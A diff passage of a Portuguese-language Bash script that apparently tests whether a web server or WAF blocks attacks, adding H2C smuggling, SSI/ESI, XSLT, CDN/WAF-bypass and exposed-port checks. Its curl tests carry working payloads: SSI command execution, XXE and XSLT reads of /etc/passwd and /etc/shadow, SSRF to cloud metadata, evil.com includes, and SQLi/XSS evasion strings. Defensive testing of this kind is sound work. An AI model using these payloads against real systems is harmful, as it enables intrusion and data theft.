+    test_curl "H2C: Upgrade básico" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" -H "Connection: Upgrade, HTTP2-Settings" "$URL"
+    test_curl "H2C: Upgrade com prior knowledge" "block" -A "$UA" -Lk --http2-prior-knowledge "$URL" 2>/dev/null || true
+    test_curl "H2C: Connection: Upgrade" "block" -A "$UA" -Lk -H "Connection: Upgrade" -H "Upgrade: h2c" "$URL"
+    
+    print_subsection "H2C via Diferentes Paths"
+    test_curl "H2C: /admin endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/admin"
+    test_curl "H2C: /internal endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/internal"
+    test_curl "H2C: /api endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/api"
+    test_curl "H2C: /metrics endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/metrics"
+    test_curl "H2C: /health endpoint" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Connection: Upgrade" "${URL}/health"
+    
+    print_subsection "H2C Settings Manipulation"
+    test_curl "H2C: Settings vazio" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: " -H "Connection: Upgrade, HTTP2-Settings" "$URL"
+    test_curl "H2C: Settings inválido" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: INVALID" -H "Connection: Upgrade" "$URL"
+    test_curl "H2C: Settings malformado" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: ////" -H "Connection: Upgrade" "$URL"
+    test_curl "H2C: Settings muito longo" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: $(head -c 1000 /dev/zero | base64)" -H "Connection: Upgrade" "$URL"
+    
+    print_subsection "H2C Tunnel para Serviços Internos"
+    test_curl "H2C: Host interno" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Host: localhost:8080" "$URL"
+    test_curl "H2C: Host 127.0.0.1" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Host: 127.0.0.1" "$URL"
+    test_curl "H2C: Acesso a metadata" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Host: 169.254.169.254" "$URL"
+    
+    print_subsection "H2C com Métodos Diferentes"
+    test_curl "H2C: POST upgrade" "block" -A "$UA" -Lk -X POST -H "Upgrade: h2c" -H "Connection: Upgrade" "$URL"
+    test_curl "H2C: PUT upgrade" "block" -A "$UA" -Lk -X PUT -H "Upgrade: h2c" -H "Connection: Upgrade" "$URL"
+    test_curl "H2C: OPTIONS upgrade" "block" -A "$UA" -Lk -X OPTIONS -H "Upgrade: h2c" -H "Connection: Upgrade" "$URL"
+    test_curl "H2C: CONNECT via h2c" "block" -A "$UA" -Lk -X CONNECT -H "Upgrade: h2c" "$URL"
+}
+
+#==============================================================================
+# SSI / ESI INJECTION (Server/Edge Side Includes)
+#==============================================================================
+test_ssi_esi_injection() {
+    print_section "📄 TESTES DE SSI / ESI INJECTION (30 testes)"
+    
+    print_subsection "Server-Side Includes (SSI)"
+    test_curl "SSI: <!--#echo var" "block" -A "$UA" -Lk "${URL}?page=<!--%23echo%20var=%22DOCUMENT_ROOT%22-->"
+    test_curl "SSI: <!--#exec cmd" "block" -A "$UA" -Lk "${URL}?page=<!--%23exec%20cmd=%22id%22-->"
+    test_curl "SSI: <!--#exec cgi" "block" -A "$UA" -Lk "${URL}?page=<!--%23exec%20cgi=%22/cgi-bin/test.cgi%22-->"
+    test_curl "SSI: <!--#include file" "block" -A "$UA" -Lk "${URL}?page=<!--%23include%20file=%22/etc/passwd%22-->"
+    test_curl "SSI: <!--#include virtual" "block" -A "$UA" -Lk "${URL}?page=<!--%23include%20virtual=%22/admin%22-->"
+    test_curl "SSI: <!--#config errmsg" "block" -A "$UA" -Lk "${URL}?page=<!--%23config%20errmsg=%22Error%22-->"
+    test_curl "SSI: <!--#set var" "block" -A "$UA" -Lk "${URL}?page=<!--%23set%20var=%22x%22%20value=%22test%22-->"
+    test_curl "SSI: <!--#printenv" "block" -A "$UA" -Lk "${URL}?page=<!--%23printenv-->"
+    
+    print_subsection "SSI em Headers"
+    test_curl "SSI: User-Agent injection" "block" -Lk -A "<!--#exec cmd=\"id\"-->" "$URL"
+    test_curl "SSI: Referer injection" "block" -A "$UA" -Lk -e "<!--#exec cmd=\"cat /etc/passwd\"-->" "$URL"
+    test_curl "SSI: Cookie injection" "block" -A "$UA" -Lk --cookie "x=<!--#exec cmd=\"id\"-->" "$URL"
+    
+    print_subsection "Edge Side Includes (ESI)"
+    test_curl "ESI: <esi:include src" "block" -A "$UA" -Lk "${URL}?page=<esi:include%20src=%22http://evil.com/steal%22/>"
+    test_curl "ESI: <esi:include file" "block" -A "$UA" -Lk "${URL}?page=<esi:include%20src=%22/etc/passwd%22/>"
+    test_curl "ESI: <esi:inline" "block" -A "$UA" -Lk "${URL}?page=<esi:inline%20name=%22test%22>content</esi:inline>"
+    test_curl "ESI: <esi:comment" "block" -A "$UA" -Lk "${URL}?page=<esi:comment%20text=%22hidden%22/>"
+    test_curl "ESI: <esi:remove" "block" -A "$UA" -Lk "${URL}?page=<esi:remove>content</esi:remove>"
+    test_curl "ESI: <esi:try" "block" -A "$UA" -Lk "${URL}?page=<esi:try><esi:attempt><esi:include%20src=%22/test%22/></esi:attempt></esi:try>"
+    test_curl "ESI: <esi:choose" "block" -A "$UA" -Lk "${URL}?page=<esi:choose><esi:when%20test=%22true%22>content</esi:when></esi:choose>"
+    test_curl "ESI: <esi:vars" "block" -A "$UA" -Lk "${URL}?page=<esi:vars>\$(HTTP_COOKIE)</esi:vars>"
+    
+    print_subsection "ESI via Headers"
+    test_curl "ESI: X-ESI-Header" "block" -A "$UA" -Lk -H "X-ESI: <esi:include src=\"/admin\"/>" "$URL"
+    test_curl "ESI: Surrogate-Capability" "block" -A "$UA" -Lk -H "Surrogate-Capability: evil=\"ESI/1.0\"" "$URL"
+    test_curl "ESI: Surrogate-Control" "block" -A "$UA" -Lk -H "Surrogate-Control: content=\"ESI/1.0\"" "$URL"
+    
+    print_subsection "SSI/ESI com Encoding"
+    test_curl "SSI: URL encoded" "block" -A "$UA" -Lk "${URL}?x=%3C%21--%23exec+cmd%3D%22id%22--%3E"
+    test_curl "SSI: Double encoded" "block" -A "$UA" -Lk "${URL}?x=%253C%2521--%2523exec+cmd%253D%2522id%2522--%253E"
+    test_curl "ESI: URL encoded" "block" -A "$UA" -Lk "${URL}?x=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2Fevil.com%22%2F%3E"
+    test_curl "ESI: Unicode" "block" -A "$UA" -Lk "${URL}?x=\\u003cesi:include src=\"/test\"/\\u003e"
+    
+    print_subsection "Varnish/Akamai Specific"
+    test_curl "ESI: Varnish syntax" "block" -A "$UA" -Lk "${URL}?page=<esi:include%20src=%22/\$(QUERY_STRING)%22/>"
+    test_curl "ESI: Akamai debug" "block" -A "$UA" -Lk -H "Pragma: akamai-x-get-cache-key" "$URL"
+    test_curl "ESI: Fastly debug" "block" -A "$UA" -Lk -H "Fastly-Debug: 1" "$URL"
+}
+
+#==============================================================================
+# CDN / CLOUDFLARE BYPASS
+#==============================================================================
+test_cdn_bypass() {
+    print_section "☁️ TESTES DE CDN / CLOUDFLARE BYPASS (25 testes)"
+    
+    echo -e "  ${YELLOW}ℹ️  Tentativas de descobrir IP real atrás de CDN/WAF${NC}"
+    echo ""
+    
+    local host_part
+    host_part=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
+    local base_host
+    base_host=$(echo "$host_part" | sed -E 's|:[0-9]+$||')
+    
+    print_subsection "Headers para Bypass de CDN"
+    test_curl "CDN Bypass: CF-Connecting-IP" "block" -A "$UA" -Lk -H "CF-Connecting-IP: 127.0.0.1" "$URL"
+    test_curl "CDN Bypass: True-Client-IP" "block" -A "$UA" -Lk -H "True-Client-IP: 127.0.0.1" "$URL"
+    test_curl "CDN Bypass: X-Client-IP" "block" -A "$UA" -Lk -H "X-Client-IP: 127.0.0.1" "$URL"
+    test_curl "CDN Bypass: X-Cluster-Client-IP" "block" -A "$UA" -Lk -H "X-Cluster-Client-IP: 127.0.0.1" "$URL"
+    test_curl "CDN Bypass: X-Real-IP interno" "block" -A "$UA" -Lk -H "X-Real-IP: 10.0.0.1" "$URL"
+    test_curl "CDN Bypass: Fastly-Client-IP" "block" -A "$UA" -Lk -H "Fastly-Client-IP: 127.0.0.1" "$URL"
+    test_curl "CDN Bypass: Akamai-Origin-Hop" "block" -A "$UA" -Lk -H "Akamai-Origin-Hop: 99" "$URL"
+    
+    print_subsection "Headers de Debug CDN"
+    test_curl "CDN Debug: X-Debug" "block" -A "$UA" -Lk -H "X-Debug: 1" "$URL"
+    test_curl "CDN Debug: X-Forwarded-Debug" "block" -A "$UA" -Lk -H "X-Forwarded-Debug: true" "$URL"
+    test_curl "CDN Debug: Pragma: akamai-x-cache-on" "block" -A "$UA" -Lk -H "Pragma: akamai-x-cache-on" "$URL"
+    test_curl "CDN Debug: X-Akamai-Debug" "block" -A "$UA" -Lk -H "X-Akamai-Debug: true" "$URL"
+    test_curl "CDN Debug: Cloudflare CF-Worker" "block" -A "$UA" -Lk -H "CF-Worker: true" "$URL"
+    
+    print_subsection "DNS Rebinding / Origin Discovery"
+    test_curl "Origin: Host: origin.\$base_host" "block" -A "$UA" -Lk -H "Host: origin.${base_host}" "$URL"
+    test_curl "Origin: Host: direct.\$base_host" "block" -A "$UA" -Lk -H "Host: direct.${base_host}" "$URL"
+    test_curl "Origin: Host: server.\$base_host" "block" -A "$UA" -Lk -H "Host: server.${base_host}" "$URL"
+    test_curl "Origin: Host: www2.\$base_host" "block" -A "$UA" -Lk -H "Host: www2.${base_host}" "$URL"
+    test_curl "Origin: Host: backend.\$base_host" "block" -A "$UA" -Lk -H "Host: backend.${base_host}" "$URL"
+    
+    print_subsection "WAF Bypass via Headers"
+    test_curl "WAF Bypass: X-Originating-IP interno" "block" -A "$UA" -Lk -H "X-Originating-IP: [127.0.0.1]" "$URL"
+    test_curl "WAF Bypass: X-Remote-IP" "block" -A "$UA" -Lk -H "X-Remote-IP: 127.0.0.1" "$URL"
+    test_curl "WAF Bypass: X-Remote-Addr" "block" -A "$UA" -Lk -H "X-Remote-Addr: 127.0.0.1" "$URL"
+    test_curl "WAF Bypass: X-ProxyUser-Ip" "block" -A "$UA" -Lk -H "X-ProxyUser-Ip: 127.0.0.1" "$URL"
+    test_curl "WAF Bypass: Client-IP" "block" -A "$UA" -Lk -H "Client-IP: 127.0.0.1" "$URL"
+    
+    print_subsection "Cloudflare Specific"
+    test_curl "CF Bypass: cdn-cgi path" "block" -A "$UA" -Lk "${URL}/cdn-cgi/trace"
+    test_curl "CF Bypass: __cf_bm cookie" "block" -A "$UA" -Lk --cookie "__cf_bm=bypass" "$URL"
+    test_curl "CF Bypass: cf_clearance" "block" -A "$UA" -Lk --cookie "cf_clearance=bypass" "$URL"
+}
+
+#==============================================================================
+# XSLT SERVER-SIDE INJECTION
+#==============================================================================
+test_xslt_injection() {
+    print_section "📝 TESTES DE XSLT SERVER-SIDE INJECTION (20 testes)"
+    
+    print_subsection "XSLT Básico em Parâmetros"
+    test_curl "XSLT: xsl:value-of" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"document('/etc/passwd')\"/>"
+    test_curl "XSLT: document()" "block" -A "$UA" -Lk "${URL}?xml=<?xml-stylesheet%20href=\"http://evil.com/xslt.xsl\"%20type=\"text/xsl\"?>"
+    test_curl "XSLT: xsl:include" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:include%20href=\"http://evil.com/evil.xsl\"/>"
+    test_curl "XSLT: xsl:import" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:import%20href=\"file:///etc/passwd\"/>"
+    
+    print_subsection "XSLT Command Execution"
+    test_curl "XSLT: PHP function" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"php:function('system','id')\"/>"
+    test_curl "XSLT: Java extension" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"Runtime.getRuntime().exec('id')\"/>"
+    test_curl "XSLT: EXSLT dyn:evaluate" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"dyn:evaluate('system(\\\"id\\\")')\"/>"
+    
+    print_subsection "XSLT via Content-Type"
+    test_curl "XSLT: XML Content-Type" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://evil.com/xslt.xsl"?><root/>' "$URL"
+    test_curl "XSLT: XSLT Content-Type" "block" -A "$UA" -Lk -H "Content-Type: application/xslt+xml" -d '<xsl:stylesheet version="1.0"><xsl:template match="/"><xsl:value-of select="document(\"/etc/passwd\")"/></xsl:template></xsl:stylesheet>' "$URL"
+    
+    print_subsection "XSLT File Read"
+    test_curl "XSLT: LFI /etc/passwd" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('/etc/passwd')\"/>"
+    test_curl "XSLT: LFI /etc/shadow" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('/etc/shadow')\"/>"
+    test_curl "XSLT: LFI via unparsed-text" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"unparsed-text('/etc/passwd')\"/>"
+    
+    print_subsection "XSLT SSRF"
+    test_curl "XSLT: SSRF http" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('http://169.254.169.254/latest/meta-data/')\"/>"
+    test_curl "XSLT: SSRF localhost" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('http://127.0.0.1:8080/')\"/>"
+    test_curl "XSLT: SSRF file" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('file:///etc/passwd')\"/>"
+    
+    print_subsection "XSLT em Headers"
+    test_curl "XSLT: Accept header" "block" -A "$UA" -Lk -H "Accept: application/xslt+xml" "$URL"
+    test_curl "XSLT: X-XSLT header" "block" -A "$UA" -Lk -H "X-XSLT-Template: http://evil.com/evil.xsl" "$URL"
+    
+    print_subsection "LibXML Specific"
+    test_curl "XSLT: LibXML external entities" "block" -A "$UA" -Lk -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
+    test_curl "XSLT: LibXML parameter entity" "block" -A "$UA" -Lk -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo/>' "$URL"
+}
+
+#==============================================================================
+# WAF / PROXY PROTECTIONS BYPASS
+#==============================================================================
+test_waf_bypass() {
+    print_section "🛡️ TESTES DE WAF / PROXY PROTECTIONS BYPASS (35 testes)"
+    
+    print_subsection "Encoding Bypass"
+    test_curl "WAF: URL encoding básico" "block" -A "$UA" -Lk "${URL}?x=%3Cscript%3Ealert(1)%3C/script%3E"
+    test_curl "WAF: Double URL encoding" "block" -A "$UA" -Lk "${URL}?x=%253Cscript%253Ealert(1)%253C/script%253E"
+    test_curl "WAF: Triple URL encoding" "block" -A "$UA" -Lk "${URL}?x=%25253Cscript%25253Ealert(1)%25253C/script%25253E"
+    test_curl "WAF: Unicode encoding" "block" -A "$UA" -Lk "${URL}?x=%u003Cscript%u003Ealert(1)"
+    test_curl "WAF: UTF-8 overlong" "block" -A "$UA" -Lk "${URL}?x=%C0%BCscript%C0%BE"
+    test_curl "WAF: Hex encoding" "block" -A "$UA" -Lk "${URL}?x=0x3C7363726970743E"
+    test_curl "WAF: Mixed case" "block" -A "$UA" -Lk "${URL}?x=<ScRiPt>alert(1)</sCrIpT>"
+    test_curl "WAF: Null byte" "block" -A "$UA" -Lk "${URL}?x=<scr%00ipt>alert(1)</script>"
+    
+    print_subsection "SQL Injection WAF Bypass"
+    test_curl "WAF SQLi: Comentários inline" "block" -A "$UA" -Lk "${URL}?id=1'/**/OR/**/1=1--"
+    test_curl "WAF SQLi: Tabs ao invés de espaços" "block" -A "$UA" -Lk "${URL}?id=1'%09OR%091=1--"
+    test_curl "WAF SQLi: Newlines" "block" -A "$UA" -Lk "${URL}?id=1'%0AOR%0A1=1--"
+    test_curl "WAF SQLi: Comentários aninhados" "block" -A "$UA" -Lk "${URL}?id=1'/*!50000OR*/1=1--"
+    test_curl "WAF SQLi: Version specific" "block" -A "$UA" -Lk "${URL}?id=1'/*!OR*/1=1--"
+    test_curl "WAF SQLi: Função alternativa" "block" -A "$UA" -Lk "${URL}?id=1'||1=1--"
+    
+    print_subsection "XSS WAF Bypass"
+    test_curl "WAF XSS: SVG onload" "block" -A "$UA" -Lk "${URL}?x=<svg/onload=alert(1)>"
+    test_curl "WAF XSS: IMG com tab" "block" -A "$UA" -Lk "${URL}?x=<img%09src=x%09onerror=alert(1)>"
+    test_curl "WAF XSS: Event handler alternativo" "block" -A "$UA" -Lk "${URL}?x=<body%20onpageshow=alert(1)>"
+    test_curl "WAF XSS: Data URI" "block" -A "$UA" -Lk "${URL}?x=<a%20href=data:text/html,<script>alert(1)</script>>"
+    test_curl "WAF XSS: HTML entities" "block" -A "$UA" -Lk "${URL}?x=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
+    
+    print_subsection "Header Manipulation Bypass"
+    test_curl "WAF Bypass: Content-Type charset" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded; charset=ibm500" "$URL"
+    test_curl "WAF Bypass: Transfer-Encoding obfuscado" "block" -A "$UA" -Lk -H "Transfer-Encoding: \tchunked" "$URL"
+    test_curl "WAF Bypass: HTTP Parameter Pollution" "block" -A "$UA" -Lk "${URL}?id=1&id=2'OR'1'='1"
+    
+    print_subsection "HTTP Method Bypass"
+    test_curl "WAF Bypass: X-HTTP-Method-Override" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: PUT" "$URL"
+    test_curl "WAF Bypass: X-Method-Override" "block" -A "$UA" -Lk -H "X-Method-Override: DELETE" "$URL"
+    test_curl "WAF Bypass: X-HTTP-Method" "block" -A "$UA" -Lk -H "X-HTTP-Method: TRACE" "$URL"
+    
+    print_subsection "Path Bypass"
+    test_curl "WAF Bypass: /./admin" "block" -A "$UA" -Lk "${URL}/./admin"
+    test_curl "WAF Bypass: //admin" "block" -A "$UA" -Lk "${URL}//admin"
+    test_curl "WAF Bypass: /admin;.css" "block" -A "$UA" -Lk "${URL}/admin;.css"
+    test_curl "WAF Bypass: /admin%20" "block" -A "$UA" -Lk "${URL}/admin%20"
+    test_curl "WAF Bypass: /admin%09" "block" -A "$UA" -Lk "${URL}/admin%09"
+    
+    print_subsection "Size-Based Bypass"
+    test_curl "WAF Bypass: Body muito grande" "block" -A "$UA" -Lk -X POST -d "\$(head -c 100000 /dev/zero | tr '\\0' 'A')&x=<script>alert(1)</script>" "$URL"
+    test_curl "WAF Bypass: Muitos parâmetros" "block" -A "$UA" -Lk "${URL}?\$(for i in {1..100}; do echo -n \"p\$i=v&\"; done)evil=<script>alert(1)</script>"
+    test_curl "WAF Bypass: Header muito longo" "block" -A "$UA" -Lk -H "X-Long: \$(head -c 10000 /dev/zero | tr '\\0' 'A')" "${URL}?x=<script>alert(1)</script>"
+    
+    print_subsection "Protocol-Level Bypass"
+    test_curl "WAF Bypass: HTTP/0.9" "block" -A "$UA" -Lk --http0.9 "$URL" 2>/dev/null || true
+    test_curl "WAF Bypass: Absolute URI" "block" -A "$UA" -Lk "${URL}?x=<script>alert(1)</script>" -H "Host: "
+}
+
+#==============================================================================
+# EXPOSED PORTS CHECK (Serviços que devem estar limitados a localhost)
+#==============================================================================
+test_exposed_ports() {
+    print_section "🔌 TESTES DE PORTAS EXPOSTAS (Serviços Sensíveis)"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando portas de serviços que NÃO devem estar expostos externamente${NC}"
+    echo -e "  ${YELLOW}   Esses serviços devem estar limitados a localhost (127.0.0.1)${NC}"
+    echo ""
+    
+    # Extrair host da URL
+    local host_part
+    host_part=$(echo "$URL" | sed -E 's|https?://([^/:]+).*|\1|')
+    
+    # Verificar se nc está disponível
+    if ! command -v nc &> /dev/null; then
+        echo -e "  ${RED}❌ netcat (nc) não encontrado. Instale com: apt install netcat-openbsd${NC}"
+        return
+    fi
+    
+    # Função auxiliar para testar porta
+    test_port() {
+        local port="$1"
+        local service="$2"
+        local risk="$3"
+        
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        
+        # Timeout de 3 segundos para verificar a porta
+        if nc -z -w 3 "$host_part" "$port" 2>/dev/null; then
+            # Porta aberta - isso é RUIM para serviços internos
+            echo -e "  ${RED}[✗]${NC} Porta $port ($service) - ${RED}EXPOSTA${NC} - $risk"
+            FAILED_TESTS=$((FAILED_TESTS + 1))
+            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] Porta $port ($service) - EXPOSTA" >> "$OUTPUT_FILE"
+        else
+            # Porta fechada ou filtrada - isso é BOM
+            echo -e "  ${GREEN}[✓]${NC} Porta $port ($service) - ${GREEN}PROTEGIDA${NC}"
+            PASSED_TESTS=$((PASSED_TESTS + 1))
+            [ -n "$OUTPUT_FILE" ] && echo "[PASS] Porta $port ($service) - Protegida" >> "$OUTPUT_FILE"
+        fi
+    }
+    
+    print_subsection "Bancos de Dados (CRÍTICO)"
+    test_port 3306 "MySQL/MariaDB" "Acesso direto ao banco de dados"
+    test_port 5432 "PostgreSQL" "Acesso direto ao banco de dados"
+    test_port 27017 "MongoDB" "Data theft, ransomware attacks"
+    test_port 1433 "MSSQL" "Acesso direto ao banco SQL Server"
+    test_port 1521 "Oracle" "Acesso direto ao banco Oracle"
+    
+    print_subsection "Cache e Message Queue (CRÍTICO)"
+    test_port 6379 "Redis" "RCE, data theft (sem auth por padrão)"
+    test_port 11211 "Memcached" "DDoS amplification, cache theft"
+    test_port 5672 "RabbitMQ AMQP" "Message queue access"
+    test_port 15672 "RabbitMQ Admin" "Admin panel exposure"
+    
+    print_subsection "Search Engines e Key-Value Stores"
+    test_port 9200 "Elasticsearch HTTP" "Index access, potential RCE"
+    test_port 9300 "Elasticsearch Transport" "Cluster access"
+    test_port 7474 "Neo4j HTTP" "Graph database access"
+    test_port 8529 "ArangoDB" "Multi-model database access"
+    test_port 7000 "Cassandra" "NoSQL database access"
+    test_port 9042 "Cassandra CQL" "CQL native protocol"
+    
+    print_subsection "Container e Orquestração (CRÍTICO)"
+    test_port 2375 "Docker API (HTTP)" "RCE completo - container escape"
+    test_port 2376 "Docker API (HTTPS)" "RCE completo - container escape"
+    test_port 2379 "etcd Client" "Kubernetes secrets exposure"
+    test_port 2380 "etcd Peer" "etcd cluster access"
+    test_port 6443 "Kubernetes API" "Cluster takeover"
+    test_port 10250 "Kubelet" "Node access, pod execution"
+    test_port 10255 "Kubelet Read-Only" "Pod information leak"
+    
+    print_subsection "Aplicações e Desenvolvimento"
+    test_port 9000 "PHP-FPM" "RCE se exposto"
+    test_port 8080 "HTTP Alt (Dev/Tomcat)" "Aplicações não protegidas"
+    test_port 8443 "HTTPS Alt" "Aplicações não protegidas"
+    test_port 3000 "Node.js Dev" "Dev server exposure"
+    test_port 5000 "Flask/Python Dev" "Dev server exposure"
+    test_port 4000 "Dev Server" "Dev server exposure"
+    test_port 9090 "Prometheus" "Metrics exposure"
+    test_port 3100 "Grafana Loki" "Log data exposure"
+    
+    print_subsection "Administração e Monitoramento"
+    test_port 8000 "Django Dev" "Dev server exposure"
+    test_port 9001 "Supervisor" "Process control"
+    test_port 61616 "ActiveMQ" "Message broker access"
+    test_port 8161 "ActiveMQ Admin" "Admin console"
+    test_port 50070 "Hadoop NameNode" "HDFS access"
+    test_port 8088 "Hadoop YARN" "Resource manager"
+    
+    print_subsection "Mail e Outros Serviços"
+    test_port 25 "SMTP" "Email relay abuse"
+    test_port 587 "SMTP Submission" "Email relay"
+    test_port 110 "POP3" "Email access"
+    test_port 143 "IMAP" "Email access"
+    test_port 21 "FTP" "Unencrypted file transfer"
+    test_port 23 "Telnet" "Unencrypted remote access"
+    test_port 69 "TFTP" "Trivial FTP (no auth)"
+    
+    print_subsection "Remote Access (verificar proteção)"
+    test_port 22 "SSH" "Brute force (verificar fail2ban)"
+    test_port 3389 "RDP" "Windows Remote Desktop"
+    test_port 5900 "VNC" "Remote desktop"
+    test_port 5901 "VNC :1" "Remote desktop"
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Recomendações de Hardening:${NC}"
+    echo -e "  ${YELLOW}• MySQL/MariaDB:${NC} bind-address = 127.0.0.1 em /etc/mysql/my.cnf"
+    echo -e "  ${YELLOW}• Redis:${NC} bind 127.0.0.1 e requirepass em /etc/redis/redis.conf"
+    echo -e "  ${YELLOW}• PostgreSQL:${NC} listen_addresses = 'localhost' em postgresql.conf"
+    echo -e "  ${YELLOW}• MongoDB:${NC} bindIp: 127.0.0.1 em /etc/mongod.conf"
+    echo -e "  ${YELLOW}• Elasticsearch:${NC} network.host: 127.0.0.1 em elasticsearch.yml"
+    echo -e "  ${YELLOW}• PHP-FPM:${NC} listen = 127.0.0.1:9000 ou unix socket"
+    echo -e "  ${YELLOW}• Docker:${NC} Nunca expor o socket sem TLS e autenticação"
+    echo -e "  ${YELLOW}• Firewall:${NC} Use nftables/iptables para bloquear portas desnecessárias"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
 # RESUMO FINAL
 #==============================================================================
 print_summary() {
@@ -1330,6 +2153,18 @@ case $CATEGORY in
     ssrf) test_ssrf_attacks ;;
     pathbypass|bypass) test_path_bypass ;;
     injection|injections) test_injection_vulnerabilities ;;
+    ratelimit|bruteforce|login) test_rate_limiting ;;
+    protocol|protocols|http) test_http_protocols ;;
+    hopbyhop|hbh) test_hop_by_hop_headers ;;
+    cache|cachepoisoning|cachedeception) test_cache_poisoning ;;
+    contamination|connectioncontamination) test_connection_contamination ;;
+    responsesmuggling|desync) test_response_smuggling ;;
+    h2c|h2csmuggling) test_h2c_smuggling ;;
+    ssi|esi|ssiesi) test_ssi_esi_injection ;;
+    cdn|cloudflare|cdnbypass) test_cdn_bypass ;;
+    xslt|xsltinjection) test_xslt_injection ;;
+    waf|wafbypass|proxy) test_waf_bypass ;;
+    ports|exposedports|portscan) test_exposed_ports ;;
     all)
         test_all_http_methods
         test_malicious_cookies
@@ -1347,7 +2182,19 @@ case $CATEGORY in
         test_database_attacks
         test_ssrf_attacks
         test_injection_vulnerabilities
+        test_rate_limiting
         test_path_bypass
+        test_http_protocols
+        test_hop_by_hop_headers
+        test_cache_poisoning
+        test_connection_contamination
+        test_response_smuggling
+        test_h2c_smuggling
+        test_ssi_esi_injection
+        test_cdn_bypass
+        test_xslt_injection
+        test_waf_bypass
+        test_exposed_ports
         test_bad_user_agents
         test_bad_referers
         test_good_bots
